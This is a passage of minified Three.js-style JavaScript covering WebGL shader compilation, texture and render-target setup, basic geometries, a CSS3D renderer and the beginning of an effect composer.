morphTarget5;","attribute vec3 morphTarget6;","attribute vec3 morphTarget7;","#endif","#endif","#ifdef USE_SKINNING","attribute vec4 skinIndex;","attribute vec4 skinWeight;","#endif",""].join("\n");var b9=["precision "+l+" float;",(cd.bumpMap||cd.normalMap)?"#extension GL_OES_standard_derivatives : enable":"",b6,"#define MAX_DIR_LIGHTS "+cd.maxDirLights,"#define MAX_POINT_LIGHTS "+cd.maxPointLights,"#define MAX_SPOT_LIGHTS "+cd.maxSpotLights,"#define MAX_HEMI_LIGHTS "+cd.maxHemiLights,"#define MAX_SHADOWS "+cd.maxShadows,cd.alphaTest?"#define ALPHATEST "+cd.alphaTest:"",aP.gammaInput?"#define GAMMA_INPUT":"",aP.gammaOutput?"#define GAMMA_OUTPUT":"",aP.physicallyBasedShading?"#define PHYSICALLY_BASED_SHADING":"",(cd.useFog&&cd.fog)?"#define USE_FOG":"",(cd.useFog&&cd.fogExp)?"#define FOG_EXP2":"",cd.map?"#define USE_MAP":"",cd.envMap?"#define USE_ENVMAP":"",cd.lightMap?"#define USE_LIGHTMAP":"",cd.bumpMap?"#define USE_BUMPMAP":"",cd.normalMap?"#define USE_NORMALMAP":"",cd.specularMap?"#define USE_SPECULARMAP":"",cd.vertexColors?"#define USE_COLOR":"",cd.metal?"#define METAL":"",cd.perPixel?"#define PHONG_PER_PIXEL":"",cd.wrapAround?"#define WRAP_AROUND":"",cd.doubleSided?"#define DOUBLE_SIDED":"",cd.flipSided?"#define FLIP_SIDED":"",cd.shadowMapEnabled?"#define USE_SHADOWMAP":"",cd.shadowMapEnabled?"#define "+b4:"",cd.shadowMapDebug?"#define SHADOWMAP_DEBUG":"",cd.shadowMapCascade?"#define SHADOWMAP_CASCADE":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;",""].join("\n");var b8=e("vertex",b5+b7);var cj=e("fragment",b9+b2);c.attachShader(ce,b8);c.attachShader(ce,cj);c.linkProgram(ce);if(!c.getProgramParameter(ce,c.LINK_STATUS)){console.error("Could not initialise shader\nVALIDATE_STATUS: "+c.getProgramParameter(ce,c.VALIDATE_STATUS)+", gl error ["+c.getError()+"]")}c.deleteShader(cj);c.deleteShader(b8);ce.uniforms={};ce.attributes={};var cc,cg,cp,ck;cc=["viewMatrix","modelViewMatrix","projectionMatrix","normalMatrix","modelMatrix","cameraPosition","morphTargetInfluences"];if(cd.useVertexTexture){cc.push("boneTexture")}else{cc.push("boneGlobalMatrices")}for(cg in co){cc.push(cg)}ag(ce,cc);cc=["position","normal","uv","uv2","tangent","color","skinIndex","skinWeight","lineDistance"];for(ck=0;ck<cd.maxMorphTargets;ck++){cc.push("morphTarget"+ck)}for(ck=0;ck<cd.maxMorphNormals;ck++){cc.push("morphNormal"+ck)}for(cp in cf){cc.push(cp)}z(ce,cc);ce.id=aC++;bF.push({program:ce,code:b3,usedTimes:1});aP.info.memory.programs=bF.length;return ce}function ag(b4,b2){var b5,b3,b6;for(b5=0,b3=b2.length;b5<b3;b5++){b6=b2[b5];b4.uniforms[b6]=c.getUniformLocation(b4,b6)}}function z(b4,b2){var b5,b3,b6;for(b5=0,b3=b2.length;b5<b3;b5++){b6=b2[b5];b4.attributes[b6]=c.getAttribLocation(b4,b6)}}function ac(b3){var b5=b3.split("\n");for(var b4=0,b2=b5.length;b4<b2;b4++){b5[b4]=(b4+1)+": "+b5[b4]}return b5.join("\n")}function e(b3,b2){var b4;if(b3==="fragment"){b4=c.createShader(c.FRAGMENT_SHADER)}else{if(b3==="vertex"){b4=c.createShader(c.VERTEX_SHADER)}}c.shaderSource(b4,b2);c.compileShader(b4);if(!c.getShaderParameter(b4,c.COMPILE_STATUS)){console.error(c.getShaderInfoLog(b4));console.error(ac(b2));return null}return b4}function a9(b2){return(b2&(b2-1))===0}function al(b2,b3,b4){if(b4){c.texParameteri(b2,c.TEXTURE_WRAP_S,aU(b3.wrapS));c.texParameteri(b2,c.TEXTURE_WRAP_T,aU(b3.wrapT));c.texParameteri(b2,c.TEXTURE_MAG_FILTER,aU(b3.magFilter));c.texParameteri(b2,c.TEXTURE_MIN_FILTER,aU(b3.minFilter))}else{c.texParameteri(b2,c.TEXTURE_WRAP_S,c.CLAMP_TO_EDGE);c.texParameteri(b2,c.TEXTURE_WRAP_T,c.CLAMP_TO_EDGE);c.texParameteri(b2,c.TEXTURE_MAG_FILTER,aQ(b3.magFilter));c.texParameteri(b2,c.TEXTURE_MIN_FILTER,aQ(b3.minFilter))}if(s&&b3.type!==THREE.FloatType){if(b3.anisotropy>1||b3.__oldAnisotropy){c.texParameterf(b2,s.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(b3.anisotropy,bD));b3.__oldAnisotropy=b3.anisotropy}}}this.setTexture=function(b9,cb){if(b9.needsUpdate){if(!b9.__webglInit){b9.__webglInit=true;b9.addEventListener("dispose",ai);b9.__webglTexture=c.createTexture();aP.info.memory.textures++}c.activeTexture(c.TEXTURE0+cb);c.bindTexture(c.TEXTURE_2D,b9.__webglTexture);c.pixelStorei(c.UNPACK_FLIP_Y_WEBGL,b9.flipY);c.pixelStorei(c.UNPACK_PREMULTIPLY_ALPHA_WEBGL,b9.premultiplyAlpha);c.pixelStorei(c.UNPACK_ALIGNMENT,b9.unpackAlignment);var b5=b9.image,b8=a9(b5.width)&&a9(b5.height),b2=aU(b9.format),b4=aU(b9.type);al(c.TEXTURE_2D,b9,b8);var b3,b6=b9.mipmaps;if(b9 instanceof THREE.DataTexture){if(b6.length>0&&b8){for(var b7=0,ca=b6.length;b7<ca;b7++){b3=b6[b7];c.texImage2D(c.TEXTURE_2D,b7,b2,b3.width,b3.height,0,b2,b4,b3.data)}b9.generateMipmaps=false}else{c.texImage2D(c.TEXTURE_2D,0,b2,b5.width,b5.height,0,b2,b4,b5.data)}}else{if(b9 instanceof THREE.CompressedTexture){for(var b7=0,ca=b6.length;b7<ca;b7++){b3=b6[b7];c.compressedTexImage2D(c.TEXTURE_2D,b7,b2,b3.width,b3.height,0,b3.data)}}else{if(b6.length>0&&b8){for(var b7=0,ca=b6.length;b7<ca;b7++){b3=b6[b7];c.texImage2D(c.TEXTURE_2D,b7,b2,b2,b4,b3)}b9.generateMipmaps=false}else{c.texImage2D(c.TEXTURE_2D,0,b2,b2,b4,b9.image)}}}if(b9.generateMipmaps&&b8){c.generateMipmap(c.TEXTURE_2D)}b9.needsUpdate=false;if(b9.onUpdate){b9.onUpdate()}}else{c.activeTexture(c.TEXTURE0+cb);c.bindTexture(c.TEXTURE_2D,b9.__webglTexture)}};function u(b7,b8){if(b7.width<=b8&&b7.height<=b8){return b7}var b6=Math.max(b7.width,b7.height);var b5=Math.floor(b7.width*b8/b6);var b3=Math.floor(b7.height*b8/b6);var b4=document.createElement("canvas");b4.width=b5;b4.height=b3;var b2=b4.getContext("2d");b2.drawImage(b7,0,0,b7.width,b7.height,0,0,b5,b3);return b4}function bn(cd,ce){if(cd.image.length===6){if(cd.needsUpdate){if(!cd.image.__webglTextureCube){cd.image.__webglTextureCube=c.createTexture();aP.info.memory.textures++}c.activeTexture(c.TEXTURE0+ce);c.bindTexture(c.TEXTURE_CUBE_MAP,cd.image.__webglTextureCube);c.pixelStorei(c.UNPACK_FLIP_Y_WEBGL,cd.flipY);var b5=cd instanceof THREE.CompressedTexture;var b2=[];for(var cb=0;cb<6;cb++){if(aP.autoScaleCubemaps&&!b5){b2[cb]=u(cd.image[cb],ap)}else{b2[cb]=cd.image[cb]}}var b8=b2[0],cc=a9(b8.width)&&a9(b8.height),b3=aU(cd.format),b6=aU(cd.type);al(c.TEXTURE_CUBE_MAP,cd,cc);for(var cb=0;cb<6;cb++){if(b5){var b4,b7=b2[cb].mipmaps;for(var b9=0,ca=b7.length;b9<ca;b9++){b4=b7[b9];c.compressedTexImage2D(c.TEXTURE_CUBE_MAP_POSITIVE_X+cb,b9,b3,b4.width,b4.height,0,b4.data)}}else{c.texImage2D(c.TEXTURE_CUBE_MAP_POSITIVE_X+cb,0,b3,b3,b6,b2[cb])}}if(cd.generateMipmaps&&cc){c.generateMipmap(c.TEXTURE_CUBE_MAP)}cd.needsUpdate=false;if(cd.onUpdate){cd.onUpdate()}}else{c.activeTexture(c.TEXTURE0+ce);c.bindTexture(c.TEXTURE_CUBE_MAP,cd.image.__webglTextureCube)}}}function bb(b2,b3){c.activeTexture(c.TEXTURE0+b3);c.bindTexture(c.TEXTURE_CUBE_MAP,b2.__webglTexture)}function ba(b4,b3,b2){c.bindFramebuffer(c.FRAMEBUFFER,b4);c.framebufferTexture2D(c.FRAMEBUFFER,c.COLOR_ATTACHMENT0,b2,b3.__webglTexture,0)}function t(b2,b3){c.bindRenderbuffer(c.RENDERBUFFER,b2);if(b3.depthBuffer&&!b3.stencilBuffer){c.renderbufferStorage(c.RENDERBUFFER,c.DEPTH_COMPONENT16,b3.width,b3.height);c.framebufferRenderbuffer(c.FRAMEBUFFER,c.DEPTH_ATTACHMENT,c.RENDERBUFFER,b2)}else{if(b3.depthBuffer&&b3.stencilBuffer){c.renderbufferStorage(c.RENDERBUFFER,c.DEPTH_STENCIL,b3.width,b3.height);c.framebufferRenderbuffer(c.FRAMEBUFFER,c.DEPTH_STENCIL_ATTACHMENT,c.RENDERBUFFER,b2)}else{c.renderbufferStorage(c.RENDERBUFFER,c.RGBA4,b3.width,b3.height)}}}this.setRenderTarget=function(b6){var b8=(b6 instanceof THREE.WebGLRenderTargetCube);if(b6&&!b6.__webglFramebuffer){if(b6.depthBuffer===undefined){b6.depthBuffer=true}if(b6.stencilBuffer===undefined){b6.stencilBuffer=true}b6.addEventListener("dispose",R);b6.__webglTexture=c.createTexture();aP.info.memory.textures++;var b9=a9(b6.width)&&a9(b6.height),b2=aU(b6.format),b4=aU(b6.type);if(b8){b6.__webglFramebuffer=[];b6.__webglRenderbuffer=[];c.bindTexture(c.TEXTURE_CUBE_MAP,b6.__webglTexture);al(c.TEXTURE_CUBE_MAP,b6,b9);for(var b5=0;b5<6;b5++){b6.__webglFramebuffer[b5]=c.createFramebuffer();b6.__webglRenderbuffer[b5]=c.createRenderbuffer();c.texImage2D(c.TEXTURE_CUBE_MAP_POSITIVE_X+b5,0,b2,b6.width,b6.height,0,b2,b4,null);ba(b6.__webglFramebuffer[b5],b6,c.TEXTURE_CUBE_MAP_POSITIVE_X+b5);t(b6.__webglRenderbuffer[b5],b6)}if(b9){c.generateMipmap(c.TEXTURE_CUBE_MAP)}}else{b6.__webglFramebuffer=c.createFramebuffer();if(b6.shareDepthFrom){b6.__webglRenderbuffer=b6.shareDepthFrom.__webglRenderbuffer}else{b6.__webglRenderbuffer=c.createRenderbuffer()}c.bindTexture(c.TEXTURE_2D,b6.__webglTexture);al(c.TEXTURE_2D,b6,b9);c.texImage2D(c.TEXTURE_2D,0,b2,b6.width,b6.height,0,b2,b4,null);ba(b6.__webglFramebuffer,b6,c.TEXTURE_2D);if(b6.shareDepthFrom){if(b6.depthBuffer&&!b6.stencilBuffer){c.framebufferRenderbuffer(c.FRAMEBUFFER,c.DEPTH_ATTACHMENT,c.RENDERBUFFER,b6.__webglRenderbuffer)}else{if(b6.depthBuffer&&b6.stencilBuffer){c.framebufferRenderbuffer(c.FRAMEBUFFER,c.DEPTH_STENCIL_ATTACHMENT,c.RENDERBUFFER,b6.__webglRenderbuffer)}}}else{t(b6.__webglRenderbuffer,b6)}if(b9){c.generateMipmap(c.TEXTURE_2D)}}if(b8){c.bindTexture(c.TEXTURE_CUBE_MAP,null)}else{c.bindTexture(c.TEXTURE_2D,null)}c.bindRenderbuffer(c.RENDERBUFFER,null);c.bindFramebuffer(c.FRAMEBUFFER,null)}var cb,b3,cc,ca,b7;if(b6){if(b8){cb=b6.__webglFramebuffer[b6.activeCubeFace]}else{cb=b6.__webglFramebuffer}b3=b6.width;cc=b6.height;ca=0;b7=0}else{cb=null;b3=bT;cc=aW;ca=a5;b7=a4}if(cb!==bH){c.bindFramebuffer(c.FRAMEBUFFER,cb);c.viewport(ca,b7,b3,cc);bH=cb}B=b3;aV=cc};function aY(b2){if(b2 instanceof THREE.WebGLRenderTargetCube){c.bindTexture(c.TEXTURE_CUBE_MAP,b2.__webglTexture);c.generateMipmap(c.TEXTURE_CUBE_MAP);c.bindTexture(c.TEXTURE_CUBE_MAP,null)}else{c.bindTexture(c.TEXTURE_2D,b2.__webglTexture);c.generateMipmap(c.TEXTURE_2D);c.bindTexture(c.TEXTURE_2D,null)}}function aQ(b2){if(b2===THREE.NearestFilter||b2===THREE.NearestMipMapNearestFilter||b2===THREE.NearestMipMapLinearFilter){return c.NEAREST}return c.LINEAR}function aU(b2){if(b2===THREE.RepeatWrapping){return c.REPEAT}if(b2===THREE.ClampToEdgeWrapping){return c.CLAMP_TO_EDGE}if(b2===THREE.MirroredRepeatWrapping){return c.MIRRORED_REPEAT}if(b2===THREE.NearestFilter){return c.NEAREST}if(b2===THREE.NearestMipMapNearestFilter){return c.NEAREST_MIPMAP_NEAREST}if(b2===THREE.NearestMipMapLinearFilter){return c.NEAREST_MIPMAP_LINEAR}if(b2===THREE.LinearFilter){return c.LINEAR}if(b2===THREE.LinearMipMapNearestFilter){return c.LINEAR_MIPMAP_NEAREST}if(b2===THREE.LinearMipMapLinearFilter){return c.LINEAR_MIPMAP_LINEAR}if(b2===THREE.UnsignedByteType){return c.UNSIGNED_BYTE}if(b2===THREE.UnsignedShort4444Type){return c.UNSIGNED_SHORT_4_4_4_4}if(b2===THREE.UnsignedShort5551Type){return c.UNSIGNED_SHORT_5_5_5_1}if(b2===THREE.UnsignedShort565Type){return c.UNSIGNED_SHORT_5_6_5}if(b2===THREE.ByteType){return c.BYTE}if(b2===THREE.ShortType){return c.SHORT}if(b2===THREE.UnsignedShortType){return c.UNSIGNED_SHORT}if(b2===THREE.IntType){return c.INT}if(b2===THREE.UnsignedIntType){return c.UNSIGNED_INT}if(b2===THREE.FloatType){return c.FLOAT}if(b2===THREE.AlphaFormat){return c.ALPHA}if(b2===THREE.RGBFormat){return c.RGB}if(b2===THREE.RGBAFormat){return c.RGBA}if(b2===THREE.LuminanceFormat){return c.LUMINANCE}if(b2===THREE.LuminanceAlphaFormat){return c.LUMINANCE_ALPHA}if(b2===THREE.AddEquation){return c.FUNC_ADD}if(b2===THREE.SubtractEquation){return c.FUNC_SUBTRACT}if(b2===THREE.ReverseSubtractEquation){return c.FUNC_REVERSE_SUBTRACT}if(b2===THREE.ZeroFactor){return c.ZERO}if(b2===THREE.OneFactor){return c.ONE}if(b2===THREE.SrcColorFactor){return c.SRC_COLOR}if(b2===THREE.OneMinusSrcColorFactor){return c.ONE_MINUS_SRC_COLOR}if(b2===THREE.SrcAlphaFactor){return c.SRC_ALPHA}if(b2===THREE.OneMinusSrcAlphaFactor){return c.ONE_MINUS_SRC_ALPHA}if(b2===THREE.DstAlphaFactor){return c.DST_ALPHA}if(b2===THREE.OneMinusDstAlphaFactor){return c.ONE_MINUS_DST_ALPHA}if(b2===THREE.DstColorFactor){return c.DST_COLOR}if(b2===THREE.OneMinusDstColorFactor){return c.ONE_MINUS_DST_COLOR}if(b2===THREE.SrcAlphaSaturateFactor){return c.SRC_ALPHA_SATURATE}if(aG!==undefined){if(b2===THREE.RGB_S3TC_DXT1_Format){return aG.COMPRESSED_RGB_S3TC_DXT1_EXT}if(b2===THREE.RGBA_S3TC_DXT1_Format){return aG.COMPRESSED_RGBA_S3TC_DXT1_EXT}if(b2===THREE.RGBA_S3TC_DXT3_Format){return aG.COMPRESSED_RGBA_S3TC_DXT3_EXT}if(b2===THREE.RGBA_S3TC_DXT5_Format){return aG.COMPRESSED_RGBA_S3TC_DXT5_EXT}}return 0}function aK(b5){if(Y&&b5&&b5.useVertexTexture){return 1024}else{var b3=c.getParameter(c.MAX_VERTEX_UNIFORM_VECTORS);var b4=Math.floor((b3-20)/4);var b2=b4;if(b5!==undefined&&b5 instanceof THREE.SkinnedMesh){b2=Math.min(b5.bones.length,b2);if(b2<b5.bones.length){console.warn("WebGLRenderer: too many bones - "+b5.bones.length+", this GPU supports just "+b2+" (try OpenGL instead of ANGLE)")}}return b2}}function bh(b4){var b3,b7,b2,b5,b9,b6,b8;b5=b9=b6=b8=0;for(b3=0,b7=b4.length;b3<b7;b3++){b2=b4[b3];if(b2.onlyShadow){continue}if(b2 instanceof THREE.DirectionalLight){b5++}if(b2 instanceof THREE.PointLight){b9++}if(b2 instanceof THREE.SpotLight){b6++}if(b2 instanceof THREE.HemisphereLight){b8++}}return{directional:b5,point:b9,spot:b6,hemi:b8}}function Z(b4){var b3,b6,b2,b5=0;for(b3=0,b6=b4.length;b3<b6;b3++){b2=b4[b3];if(!b2.castShadow){continue}if(b2 instanceof THREE.SpotLight){b5++}if(b2 instanceof THREE.DirectionalLight&&!b2.shadowCascade){b5++}}return b5}function bs(){try{if(!(c=aZ.getContext("experimental-webgl",{alpha:bE,premultipliedAlpha:a2,antialias:b0,stencil:f,preserveDrawingBuffer:X}))){throw"Error creating WebGL context."}}catch(b2){console.error(b2)}p=c.getExtension("OES_texture_float");bf=c.getExtension("OES_standard_derivatives");s=c.getExtension("EXT_texture_filter_anisotropic")||c.getExtension("MOZ_EXT_texture_filter_anisotropic")||c.getExtension("WEBKIT_EXT_texture_filter_anisotropic");aG=c.getExtension("WEBGL_compressed_texture_s3tc")||c.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||c.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");if(!p){console.log("THREE.WebGLRenderer: Float textures not supported.")}if(!bf){console.log("THREE.WebGLRenderer: Standard derivatives not supported.")}if(!s){console.log("THREE.WebGLRenderer: Anisotropic texture filtering not supported.")}if(!aG){console.log("THREE.WebGLRenderer: S3TC compressed textures not supported.")}if(c.getShaderPrecisionFormat===undefined){c.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}}}}function be(){c.clearColor(0,0,0,1);c.clearDepth(1);c.clearStencil(0);c.enable(c.DEPTH_TEST);c.depthFunc(c.LEQUAL);c.frontFace(c.CCW);c.cullFace(c.BACK);c.enable(c.CULL_FACE);c.enable(c.BLEND);c.blendEquation(c.FUNC_ADD);c.blendFunc(c.SRC_ALPHA,c.ONE_MINUS_SRC_ALPHA);c.clearColor(bt.r,bt.g,bt.b,W)}this.shadowMapPlugin=new THREE.ShadowMapPlugin();this.addPrePlugin(this.shadowMapPlugin);this.addPostPlugin(new THREE.SpritePlugin());this.addPostPlugin(new THREE.LensFlarePlugin())};THREE.WebGLRenderTarget=function(c,a,b){this.width=c;this.height=a;b=b||{};this.wrapS=b.wrapS!==undefined?b.wrapS:THREE.ClampToEdgeWrapping;this.wrapT=b.wrapT!==undefined?b.wrapT:THREE.ClampToEdgeWrapping;this.magFilter=b.magFilter!==undefined?b.magFilter:THREE.LinearFilter;this.minFilter=b.minFilter!==undefined?b.minFilter:THREE.LinearMipMapLinearFilter;this.anisotropy=b.anisotropy!==undefined?b.anisotropy:1;this.offset=new THREE.Vector2(0,0);this.repeat=new THREE.Vector2(1,1);this.format=b.format!==undefined?b.format:THREE.RGBAFormat;this.type=b.type!==undefined?b.type:THREE.UnsignedByteType;this.depthBuffer=b.depthBuffer!==undefined?b.depthBuffer:true;this.stencilBuffer=b.stencilBuffer!==undefined?b.stencilBuffer:true;this.generateMipmaps=true;this.shareDepthFrom=null};THREE.WebGLRenderTarget.prototype={constructor:THREE.WebGLRenderTarget,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,clone:function(){var a=new THREE.WebGLRenderTarget(this.width,this.height);a.wrapS=this.wrapS;a.wrapT=this.wrapT;a.magFilter=this.magFilter;a.minFilter=this.minFilter;a.anisotropy=this.anisotropy;a.offset.copy(this.offset);a.repeat.copy(this.repeat);a.format=this.format;a.type=this.type;a.depthBuffer=this.depthBuffer;a.stencilBuffer=this.stencilBuffer;a.generateMipmaps=this.generateMipmaps;a.shareDepthFrom=this.shareDepthFrom;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.WebGLRenderTargetCube=function(c,a,b){THREE.WebGLRenderTarget.call(this,c,a,b);this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);THREE.CubeGeometry=function(a,k,f,b,j,e){THREE.Geometry.call(this);var m=this;this.width=a;this.height=k;this.depth=f;this.widthSegments=b||1;this.heightSegments=j||1;this.depthSegments=e||1;var l=this.width/2;var h=this.height/2;var c=this.depth/2;g("z","y",-1,-1,this.depth,this.height,l,0);g("z","y",1,-1,this.depth,this.height,-l,1);g("x","z",1,1,this.width,this.depth,h,2);g("x","z",1,-1,this.width,this.depth,-h,3);g("x","y",1,-1,this.width,this.height,c,4);g("x","y",-1,-1,this.width,this.height,-c,5);function g(E,D,o,y,G,F,R,A){var C,t,s,I=m.widthSegments,H=m.heightSegments,x=G/2,r=F/2,z=m.vertices.length;if((E==="x"&&D==="y")||(E==="y"&&D==="x")){C="z"}else{if((E==="x"&&D==="z")||(E==="z"&&D==="x")){C="y";H=m.depthSegments}else{if((E==="z"&&D==="y")||(E==="y"&&D==="z")){C="x";I=m.depthSegments}}}var J=I+1,q=H+1,Q=G/I,L=F/H,P=new THREE.Vector3();P[C]=R>0?1:-1;for(s=0;s<q;s++){for(t=0;t<J;t++){var p=new THREE.Vector3();p[E]=(t*Q-x)*o;p[D]=(s*L-r)*y;p[C]=R;m.vertices.push(p)}}for(s=0;s<H;s++){for(t=0;t<I;t++){var O=t+J*s;var N=t+J*(s+1);var M=(t+1)+J*(s+1);var K=(t+1)+J*s;var B=new THREE.Face4(O+z,N+z,M+z,K+z);B.normal.copy(P);B.vertexNormals.push(P.clone(),P.clone(),P.clone(),P.clone());B.materialIndex=A;m.faces.push(B);m.faceVertexUvs[0].push([new THREE.Vector2(t/I,1-s/H),new THREE.Vector2(t/I,1-(s+1)/H),new THREE.Vector2((t+1)/I,1-(s+1)/H),new THREE.Vector2((t+1)/I,1-s/H)])}}}this.computeCentroids();this.mergeVertices()};THREE.CubeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.PlaneGeometry=function(r,q,e,p){THREE.Geometry.call(this);this.width=r;this.height=q;this.widthSegments=e||1;this.heightSegments=p||1;var h,f;var j=r/2;var g=q/2;var t=this.widthSegments;var s=this.heightSegments;var u=t+1;var o=s+1;var E=this.width/t;var z=this.height/s;var D=new THREE.Vector3(0,0,1);for(f=0;f<o;f++){for(h=0;h<u;h++){var m=h*E-j;var l=f*z-g;this.vertices.push(new THREE.Vector3(m,-l,0))}}for(f=0;f<s;f++){for(h=0;h<t;h++){var C=h+u*f;var B=h+u*(f+1);var A=(h+1)+u*(f+1);var w=(h+1)+u*f;var k=new THREE.Face4(C,B,A,w);k.normal.copy(D);k.vertexNormals.push(D.clone(),D.clone(),D.clone(),D.clone());this.faces.push(k);this.faceVertexUvs[0].push([new THREE.Vector2(h/t,1-f/s),new THREE.Vector2(h/t,1-(f+1)/s),new THREE.Vector2((h+1)/t,1-(f+1)/s),new THREE.Vector2((h+1)/t,1-f/s)])}}this.computeCentroids()};THREE.PlaneGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ImmediateRenderObject=function(){THREE.Object3D.call(this);this.render=function(a){}};THREE.ImmediateRenderObject.prototype=Object.create(THREE.Object3D.prototype);THREE.LensFlare=function(e,b,f,c,a){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3();this.customUpdateCallback=undefined;if(e!==undefined){this.add(e,b,f,c,a)}};THREE.LensFlare.prototype=Object.create(THREE.Object3D.prototype);THREE.LensFlare.prototype.add=function(f,c,g,e,a,b){if(c===undefined){c=-1}if(g===undefined){g=0}if(b===undefined){b=1}if(a===undefined){a=new THREE.Color(16777215)}if(e===undefined){e=THREE.NormalBlending}g=Math.min(g,Math.max(0,g));this.lensFlares.push({texture:f,size:c,distance:g,x:0,y:0,z:0,scale:1,rotation:1,opacity:b,color:a,blending:e})};THREE.LensFlare.prototype.updateLensFlares=function(){var e,c=this.lensFlares.length;var b;var a=-this.positionScreen.x*2;var g=-this.positionScreen.y*2;for(e=0;e<c;e++){b=this.lensFlares[e];b.x=this.positionScreen.x+a*b.distance;b.y=this.positionScreen.y+g*b.distance;b.wantedRotation=b.x*Math.PI*0.25;b.rotation+=(b.wantedRotation-b.rotation)*0.25}};THREE.LensFlarePlugin=function(){var b,c,a,e={};this.init=function(f){};this.render=function(j,h,f,g){}};THREE.ShadowMapPlugin=function(){this.init=function(a){};this.render=function(b,a){};this.update=function(b,a){}};THREE.SpritePlugin=function(){this.init=function(a){};this.render=function(e,c,a,b){}};THREE.DepthPassPlugin=function(){this.init=function(a){};this.render=function(b,a){};this.update=function(b,a){}};THREE.CSS3DObject=function(a){THREE.Object3D.call(this);this.element=a;this.element.style.position="absolute";this.element.style.WebkitTransformStyle="preserve-3d";this.element.style.MozTransformStyle="preserve-3d";this.element.style.oTransformStyle="preserve-3d";this.element.style.transformStyle="preserve-3d"};THREE.CSS3DObject.prototype=Object.create(THREE.Object3D.prototype);THREE.CSS3DSprite=function(a){THREE.CSS3DObject.call(this,a)};THREE.CSS3DSprite.prototype=Object.create(THREE.CSS3DObject.prototype);THREE.CSS3DRenderer=function(o){o=o||{};var b,e;var l,j;var k=new THREE.Matrix4();var g=o.cameraElement||document.createElement("div");var f=g.parentNode||document.createElement("div");f.style.overflow="hidden";f.style.WebkitTransformStyle="preserve-3d";f.style.WebkitPerspectiveOrigin="50% 50%";f.style.MozTransformStyle="preserve-3d";f.style.MozPerspectiveOrigin="50% 50%";f.style.oTransformStyle="preserve-3d";f.style.oPerspectiveOrigin="50% 50%";f.style.transformStyle="preserve-3d";f.style.perspectiveOrigin="50% 50%";f.classList.add("css3d-frame");this.domElement=f;g.style.WebkitTransformStyle="preserve-3d";g.style.MozTransformStyle="preserve-3d";g.style.oTransformStyle="preserve-3d";g.style.transformStyle="preserve-3d";g.classList.add("css3d-camera");g.parentNode||f.appendChild(g);this.cameraElement=g;this.setSize=function(q,p){b=q;e=p;l=b/2;j=e/2;f.style.width=q+"px";f.style.height=p+"px";g.style.width=q+"px";g.style.height=p+"px"};var m=function(p){return Math.abs(p)<0.000001?0:p};var h=function(p){var q=p.elements;return"matrix3d("+m(q[0])+","+m(-q[1])+","+m(q[2])+","+m(q[3])+","+m(q[4])+","+m(-q[5])+","+m(q[6])+","+m(q[7])+","+m(q[8])+","+m(-q[9])+","+m(q[10])+","+m(q[11])+","+m(q[12])+","+m(-q[13])+","+m(q[14])+","+m(q[15])+")"};var c=function(p){var q=p.elements;return"translate3d(-50%,-50%,0) matrix3d("+m(q[0])+","+m(q[1])+","+m(q[2])+","+m(q[3])+","+m(-q[4])+","+m(-q[5])+","+m(-q[6])+","+m(-q[7])+","+m(q[8])+","+m(q[9])+","+m(q[10])+","+m(q[11])+","+m(q[12])+","+m(q[13])+","+m(q[14])+","+m(q[15])+")"};var a=function(q,u){if(q instanceof THREE.CSS3DObject){var t;if(q instanceof THREE.CSS3DSprite){k.copy(u.matrixWorldInverse);k.transpose();k.copyPosition(q.matrixWorld);k.scale(q.scale);k.elements[3]=0;k.elements[7]=0;k.elements[11]=0;k.elements[15]=1;t=c(k)}else{t=c(q.matrixWorld)}var s=q.element;s.style.WebkitTransform=t;s.style.MozTransform=t;s.style.oTransform=t;s.style.transform=t;if(s.parentNode!==g){g.appendChild(s)}}for(var r=0,p=q.children.length;r<p;r++){a(q.children[r],u)}};this.render=function(s,r){var p=0.5/Math.tan(THREE.Math.degToRad(r.fov*0.5))*e;f.style.WebkitPerspective=p+"px";f.style.MozPerspective=p+"px";f.style.oPerspective=p+"px";f.style.perspective=p+"px";s.updateMatrixWorld();var q="translate3d(0,0,"+p+"px)"+h(r.matrixWorldInverse)+" translate3d("+l+"px,"+j+"px, 0)";g.style.WebkitTransform=q;g.style.MozTransform=q;g.style.oTransform=q;g.style.transform=q;a(s,r)}};THREE.CallbackPass=function(a){this.enabled=true;this.clear=true;this.needsSwap=false;this.callback=a};THREE.CallbackPass.prototype={render:function(b,c,a,e){this.callback(c,a)}};THREE.CopyShader={uniforms:{tDiffuse:{type:"t",value:null},opacity:{type:"f",value:1}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float opacity;","uniform sampler2D tDiffuse;","varying vec2 vUv;","void main() {","vec4 texel = texture2D( tDiffuse, vUv );","gl_FragColor = opacity * texel;","}"].join("\n")};THREE.EffectComposer=function(f,e){this.renderer=f;this.retina=f.devicePixelRatio;if(e===undefined){var b=(window.innerWidth*this.retina)||1;var a=(window.innerHeight*this.retina)||1;var c={minFilter:THREE.NearestFilter,magFilter:THREE.NearestFilter,format:THREE.RGBFormat,stencilBuffer:false,};e=new THREE.WebGLRenderTarget(b,a,c)}this.renderTarget1=e;this.renderTarget2=e.clone();this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2;this.passes=[];if(THREE.CopyShader===undefined){console.error("THREE.EffectComposer relies on THREE.CopyShader")}this.copyPass=new THREE.ShaderPass(THREE.CopyShader)};THREE.EffectComposer.prototype={swapBuffers:function(){var a=this.readBuffer;this.readBuffer=this.writeBuffer;this.writeBuffer=a},addPass:function(a){this.passes.push(a)},insertPass:function(b,a){this.passes.splice(a,0,b)},render:function(g){this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2;var a=false;var 